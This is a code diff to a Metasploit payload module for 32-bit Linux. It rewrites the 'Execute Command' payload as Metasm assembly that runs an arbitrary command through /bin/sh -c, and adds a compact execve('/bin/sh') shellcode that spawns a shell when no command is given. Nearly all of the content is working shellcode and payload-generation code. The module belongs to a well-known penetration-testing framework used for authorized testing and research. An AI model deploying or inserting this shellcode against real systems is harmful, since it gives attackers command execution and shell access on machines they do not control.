@@ -21,28 +21,62 @@ module MetasploitModule
   def initialize(info = {})
     super(merge_info(info,
       'Name'          => 'Linux Execute Command',
-      'Description'   => 'Execute an arbitrary command',
-      'Author'        => 'vlad902',
+      'Description'   => 'Execute an arbitrary command or just a /bin/sh shell',
+      'Author'        => ['vlad902',
+                          'Geyslan G. Bem <geyslan[at]gmail.com>'],
       'License'       => MSF_LICENSE,
+      'References'    => [ ['URL', 'https://github.com/geyslan/SLAE/blob/master/4th.assignment/tiny_execve_sh.asm'] ],
       'Platform'      => 'linux',
-      'Arch'          => ARCH_X86))
+      'Arch'          => ARCH_X86
+    ))
 
     # Register exec options
     register_options(
       [
-        OptString.new('CMD',  [ true,  "The command string to execute" ]),
+        OptString.new('CMD',  [ false,  "The command string to execute" ]),
       ])
   end
 
-  #
-  # Dynamically builds the exec payload based on the user's options.
-  #
   def generate_stage(opts={})
-    cmd     = datastore['CMD'] || ''
-    payload =
-      "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68" +
-      "\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52" +
-      Rex::Arch::X86.call(cmd.length + 1) + cmd + "\x00"     +
-      "\x57\x53\x89\xe1\xcd\x80"
+    cmd = datastore['CMD'] || ''
+    if !cmd.empty?
+      #
+      # Dynamically builds the exec payload based on the user's options.
+      #
+      payload = <<-EOS
+          push 0xb
+          pop eax
+          cdq
+          push edx
+          ; pushw 0x632d   ; (metasm doesn't support pushw)
+          dd 0x632d6866    ; "-c"
+          mov edi, esp
+          push 0x0068732f  ; "/sh\0"
+          push 0x6e69622f  ; "/bin"
+          mov ebx, esp
+          push edx
+          call continue
+          db "#{cmd}", 0x00
+        continue:
+          push edi
+          push ebx
+          mov ecx, esp
+          int 0x80
+      EOS
+    else
+      #
+      # execve("/bin/sh", NULL, NULL) - 20 bytes (not null-free)
+      #
+      payload = <<-EOS
+          xor ecx, ecx	   ; ecx = NULL
+          mul ecx		       ; eax and edx = NULL
+          mov al, 0xb	     ; execve syscall
+          push 0x0068732f  ; "/sh\0"
+          push 0x6e69622f	 ; "/bin"
+          mov ebx, esp	   ; pointer to "/bin/sh\0" cmd
+          int 0x80	       ; bingo
+      EOS
+    end
+    Metasm::Shellcode.assemble(Metasm::Ia32.new, payload).encode_string
   end
 end
